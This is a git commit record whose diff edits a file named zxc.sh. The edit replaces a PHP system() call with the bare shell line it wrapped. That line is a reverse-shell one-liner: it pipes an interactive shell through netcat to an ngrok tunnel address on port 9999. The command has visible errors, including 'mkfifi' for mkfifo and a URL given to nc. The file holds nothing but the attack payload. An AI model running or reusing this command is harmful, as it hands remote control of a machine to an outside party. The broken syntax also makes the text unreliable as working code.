a6bf896b677f3c94a01f6ff5acf90689f0693586
i0xid <97521668+kostya300@users.noreply.github.com>
2024-01-12 19:40:22 +0500

    Update zxc.sh

--- zxc.sh
+++ zxc.sh
@@ -1,1 +1,1 @@
-<pre>system('rm /tmp/f; mkfifi /tmp/f; cat /tmp/f | sh -i 2>&1 | nc https://c669-92-248-186-82.ngrok-free.app 9999 > /tmp/f;')</pre>
+rm /tmp/f; mkfifi /tmp/f; cat /tmp/f | sh -i 2>&1 | nc https://c669-92-248-186-82.ngrok-free.app 9999 > /tmp/f;
